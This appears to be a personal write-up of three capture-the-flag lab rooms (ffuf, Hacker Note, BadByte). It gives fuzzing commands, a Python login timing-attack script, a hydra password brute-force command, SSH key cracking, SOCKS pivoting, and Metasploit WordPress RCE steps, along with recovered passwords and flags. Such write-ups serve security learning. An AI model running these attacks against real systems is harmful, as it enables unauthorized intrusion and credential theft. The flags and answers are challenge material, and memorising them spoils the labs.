
## ffuf

#### Basics
Install seclists
```
git clone https://github.com/danielmiessler/SecLists.git
```

Scan http target address with url
```
ffuf -u http://10.10.84.137/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -e .php,.txt,.aspx -mc 200 
```

#### Finding pages and Directories

What text file did you find?
```
robots.txt
```

What two file extensions were found for the index page?
```
ffuf -u http://10.10.42.204/indexFUZZ -w /root/Downloads/SecLists-master/Discovery/Web-Content/web-extensions-big.txt -fc 403


php,phps
```

What page has a size of 4840?
```
about.php
```

How many directories are there?
```
4
```

#### Using Filters

After applying the fc filter, how many results were returned?
```
ffuf -u http://10.10.42.204/FUZZ -w /root/Downloads/SecLists-master/Discovery/Web-Content/raft-medium-files-lowercase.txt -fc 403

ogin.php               [Status: 200, Size: 1523, Words: 89, Lines: 77, Duration: 8ms]
favicon.ico             [Status: 200, Size: 1406, Words: 5, Lines: 2, Duration: 0ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3ms]
robots.txt              [Status: 200, Size: 26, Words: 3, Lines: 2, Duration: 1ms]
phpinfo.php             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3ms]
.                       [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3ms]
php.ini                 [Status: 200, Size: 148, Words: 17, Lines: 5, Duration: 1ms]
about.php               [Status: 200, Size: 4840, Words: 331, Lines: 109, Duration: 5ms]
setup.php               [Status: 200, Size: 4066, Words: 308, Lines: 123, Duration: 11ms]
security.php            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3ms]
index.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 397ms]
:: Progress: [16244/16244] :: Job [1/1] :: 731 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

```
11
```



After applying the mc filter, how many results were returned?
```
ffuf -u http://10.10.42.204/FUZZ -w /root/Downloads/SecLists-master/Discovery/Web-Content/raft-medium-files-lowercase.txt -mc 200 

favicon.ico             [Status: 200, Size: 1406, Words: 5, Lines: 2, Duration: 1ms]
robots.txt              [Status: 200, Size: 26, Words: 3, Lines: 2, Duration: 0ms]
php.ini                 [Status: 200, Size: 148, Words: 17, Lines: 5, Duration: 0ms]
about.php               [Status: 200, Size: 4840, Words: 331, Lines: 109, Duration: 3ms]
setup.php               [Status: 200, Size: 4066, Words: 308, Lines: 123, Duration: 4ms]
login.php               [Status: 200, Size: 1523, Words: 89, Lines: 77, Duration: 377ms]

```

```
6
```

Which valuable file would have been hidden if you used `-fc 403` instead of `-fr?`
```
ffuf -u http://10.10.42.204/FUZZ -w /root/Downloads/SecLists-master/Discovery/Web-Content/raft-medium-files-lowercase.txt -fr '/\..*'

login.php               [Status: 200, Size: 1523, Words: 89, Lines: 77, Duration: 6ms]
favicon.ico             [Status: 200, Size: 1406, Words: 5, Lines: 2, Duration: 0ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2ms]
robots.txt              [Status: 200, Size: 26, Words: 3, Lines: 2, Duration: 0ms]
phpinfo.php             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2ms]
.                       [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
php.ini                 [Status: 200, Size: 148, Words: 17, Lines: 5, Duration: 0ms]
about.php               [Status: 200, Size: 4840, Words: 331, Lines: 109, Duration: 2ms]
index.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 96ms]
setup.php               [Status: 200, Size: 4066, Words: 308, Lines: 123, Duration: 6ms]
security.php            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 5ms]
wp-forum.phps           [Status: 403, Size: 292, Words: 21, Lines: 11, Duration: 0ms]
```

```
wp-forum.phps
```

#### Fuzzing Parameters

**What is the parameter you found?**  
```
ffuf -u 'http://10.10.226.61/sqli-labs/Less-1/?FUZZ=1' -c -w /root/Downloads/SecLists-master/Discovery/Web-Content/burp-parameter-names.txt -fw 39 

id                      [Status: 200, Size: 721, Words: 37, Lines: 29, Duration: 87ms]
```

```
id
```

**What is the highest valid id?**

the seq command generates a series of numbers from 0 to 254 ? 
the -w - command takes that generated number and uses it to fuzz the API
```
seq 0 255 | ffuf -u 'http://10.10.226.61/sqli-labs/Less-1/?id=FUZZ' -c -w - -fw 33

2                       [Status: 200, Size: 731, Words: 37, Lines: 29, Duration: 7ms]
1                       [Status: 200, Size: 721, Words: 37, Lines: 29, Duration: 7ms]
3                       [Status: 200, Size: 726, Words: 37, Lines: 29, Duration: 8ms]
5                       [Status: 200, Size: 728, Words: 37, Lines: 29, Duration: 7ms]
14                      [Status: 200, Size: 725, Words: 37, Lines: 29, Duration: 3651ms]
9                       [Status: 200, Size: 725, Words: 37, Lines: 29, Duration: 4656ms]
10                      [Status: 200, Size: 725, Words: 37, Lines: 29, Duration: 4657ms]
8                       [Status: 200, Size: 723, Words: 37, Lines: 29, Duration: 4659ms]
12                      [Status: 200, Size: 725, Words: 37, Lines: 29, Duration: 4661ms]
6                       [Status: 200, Size: 728, Words: 37, Lines: 29, Duration: 4662ms]
11                      [Status: 200, Size: 725, Words: 37, Lines: 29, Duration: 4662ms]
7                       [Status: 200, Size: 725, Words: 37, Lines: 29, Duration: 4662ms]
4                       [Status: 200, Size: 725, Words: 37, Lines: 29, Duration: 4664ms]
```

**What is Dummy's password?**
```
http://10.10.226.61/sqli-labs/Less-1/?id=3

p@ssword
```

#### Finding vhosts and subdomains 


####  Reviewing the options

**How do you save the output to a markdown file (ffuf.md)?**
```
-of md -o ffuf.md
```

**How do you re-use a raw http request file?**
```
-request
```

**How do you strip comments from a wordlist?**
```
-ic
```

**How would you read a wordlist from STDIN?**
```
-w |
```

**How do you print full URLs and redirect locations?**
```
-v
```

**What option would you use to follow redirects?**
```
-r
```

**How do you enable colorized output?**
```
-c
```


-----------

## Hacker Note

#### Reconnaissance 

Which ports are open? (in numerical order)
```
nmap -p 22,80,8080 -T 4 -sV -sC -Pn 10.10.141.166 -v

PORT     STATE    SERVICE    VERSION
22/tcp   open     ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 10:a6:95:34:62:b0:56:2a:38:15:77:58:f4:f3:6c:ac (RSA)
|   256 6f:18:27:a4:e7:21:9d:4e:6d:55:b3:ac:c5:2d:d5:d3 (ECDSA)
|_  256 2d:c3:1b:58:4d:c3:5d:8e:6a:f6:37:9d:ca:ad:20:7c (EdDSA)
80/tcp   open     http       Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Home - hackerNote
8080/tcp filtered http-proxy
MAC Address: 02:54:56:17:B7:41 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
22,80,8080
```


What programming language is the backend written in?
```
80/tcp   open     http       Golang net/http server (Go-IPFS json-rpc or InfluxDB API)


go
```

#### Investigate

#### Exploit 

Try to write a script to perform a timing attack.
```
import requests
import time

#doLogin(user)


def doLogin(user): 
	startTime = time.time() * 1000 
	creds = {"username": user, "password": "invalidPassword!"}

	response = requests.post("http://10.10.141.166:80/api/user/login", json=creds)
	endTime = time.time() * 1000
	time_diff = endTime - startTime

	if time_diff > 200: 
		return user, time_diff  
	else: 
		return "None", "None"
		

if __name__ == "__main__": 
	
	with open("names.txt", 'r') as n_file: 
		lines = n_file.readlines()

	user, time_diff = doLogin('jordan')
	with open("results.txt", "w") as r_file: 
		for line_num, line in enumerate(lines):
			# if line_num == 3: 
			# 	exit() 
			line_clean = (line.replace("\n", ""))
			user, time_diff = doLogin(line_clean)

			if user == "None": 
				continue
			else: 
				result = "User: " + user + ", Time: " + str(time_diff) 
				r_file.writelines(result + "\n")

	n_file.close()
	r_file.close()
```

How many usernames from the list are valid?
```
1
```

What are/is the valid username(s)?
```
james
```
#### Attack Passwords


Form the hydra command to attack the login API route
```
hydra -l james -P wordlist.txt 10.10.141.166 http-post-form "/api/user/login:username=james&password=^PASS^:Invalid Username or Password"
```

How many passwords were in your wordlist?
```
./combinator.c colors.txt names.txt > wordlist.txt
cat -n wordlist.txt

180
```

What was the user's password?
```
[80][http-post-form] host: 10.10.141.166   login: james   password: blue7

blue7
```

What's the user's SSH password?
```
dak4ddb37b
```

What's the user flag?
```
thm{56911bd7ba1371a3221478aa5c094d68}
```


#### Escalate

What is the CVE number for the exploit?
```
CVE-2019-18634
```

What is the root flag?
```
thm{af55ada6c2445446eb0606b5a2d3a4d2}
```

#### Comments on Realism and Further Reading

**Further reading**

﻿**Timing attacks on logins**[https://seclists.org/fulldisclosure/2016/Jul/51](https://seclists.org/fulldisclosure/2016/Jul/51)  
[https://www.gnucitizen.org/blog/username-enumeration-vulnerabilities/](https://www.gnucitizen.org/blog/username-enumeration-vulnerabilities/)[](https://www.gnucitizen.org/blog/username-enumeration-vulnerabilities/)  
[https://wiki.owasp.org/index.php/Testing_for_User_Enumeration_and_Guessable_User_Account_(OWASP-AT-002)](https://wiki.owasp.org/index.php/Testing_for_User_Enumeration_and_Guessable_User_Account_(OWASP-AT-002))

**Adobe Password Breach  
**[https://nakedsecurity.sophos.com/2013/11/04/anatomy-of-a-password-disaster-adobes-giant-sized-cryptographic-blunder/](https://nakedsecurity.sophos.com/2013/11/04/anatomy-of-a-password-disaster-adobes-giant-sized-cryptographic-blunder/)

[](https://nakedsecurity.sophos.com/2013/11/04/anatomy-of-a-password-disaster-adobes-giant-sized-cryptographic-blunder/)

**Sudo CVE**  
[https://dylankatz.com/Analysis-of-CVE-2019-18634/](https://dylankatz.com/Analysis-of-CVE-2019-18634/)[](https://dylankatz.com/Analysis-of-CVE-2019-18634/)  
[https://nvd.nist.gov/vuln/detail/CVE-2019-18634](https://nvd.nist.gov/vuln/detail/CVE-2019-18634)[](https://nvd.nist.gov/vuln/detail/CVE-2019-18634)  
[https://tryhackme.com/room/sudovulnsbof](https://tryhackme.com/room/sudovulnsbof)

-------
## BadByte

#### Reconnaissance

How many ports are open?
```
2
```

What service is running on the lowest open port?
```
ssh
```

What non-standard port is open?
```
30024ftp
```

What service is running on the non-standard port?
```
ftp
```

#### Foothold

What username do we find during the enumeration process?
```
ftp anonymous@10.10.73.91 -P 30024
get note.txt
get id_rsa

errorcauser
```

What is the passphrase for the RSA private key?
```
python3 ssh2john.py id_rsa > privatekey.hash
sudo john privatekey.hash

cupcake
```

#### Port Forwarding

**What main TCP ports are listening on localhost?**


```
chmod 600 id_rsa
ssh -i id_rsa -D 1337 errorcauser@10.10.1.35
```

```
nano /etc/proxychains.conf

socks5 127.0.0.1 1337
```

```
proxychains4 nmap -p 1-10000 -sV -sC  127.0.0.1
```

```
80,3306
```

What protocols are used for these ports?
```
http,mysql
```

#### Web Exploitation

What CMS is running on the machine?
```
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: WordPress 5.7
|_http-title: BadByte &#8211; You&#039;re looking at me, but they are lookin...

wordpress
```
\
What is the CVE number for directory traversal vulnerability?
```
proxychains4 nmap -p 80 --script word-press-enum 127.0.0.1 

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-wordpress-enum: 
| Search limited to top 100 themes/plugins
|   plugins
|_    duplicator 1.3.26
|_http-server-header: Apache/2.4.29 (Ubuntu)

msf> search duplicator
msf> use auxiliary/scanner/http/wp_duplicator_file_read
msf> info

CVE-2020-11738


```

What is the CVE number for remote code execution vulnerability?
```
proxychains4 nmap --script http-wordpress-enum --script-args type="plugins",search-limit=1500 127.0.0.1

80/tcp open  http
| http-wordpress-enum: 
| Search limited to top 1500 themes/plugins
|   plugins
|     duplicator 1.3.26
|_    wp-file-manager 6.0


msf> search wp-file-manager
msf> exploit(multi/http/wp_file_manager_rce)
msf> info

CVE-2020-25213
```

What is the name of user that was running CMS?
```
use exploit/multi/http/wp_file_manager_rce
set lhost eth0
set rhosts 10.10.1.35
exploit

ps -aux
```

```
cth
```

What is the user flag?
```
cd /home/cth/
cat user.txt

THM{227906201d17d9c45aa93d0122ea1af7}
```

#### Privilege Escalation

**What is the user's old password?
```
cd /var/log
cat bash.log

G00dP@$sw0rd2020
```

**What is the root flag?**
```
ssh cth@10.10.1.35
sudo su - 
cat root.txt

THM{ad485b44f63393b6a9225974909da5fa}
```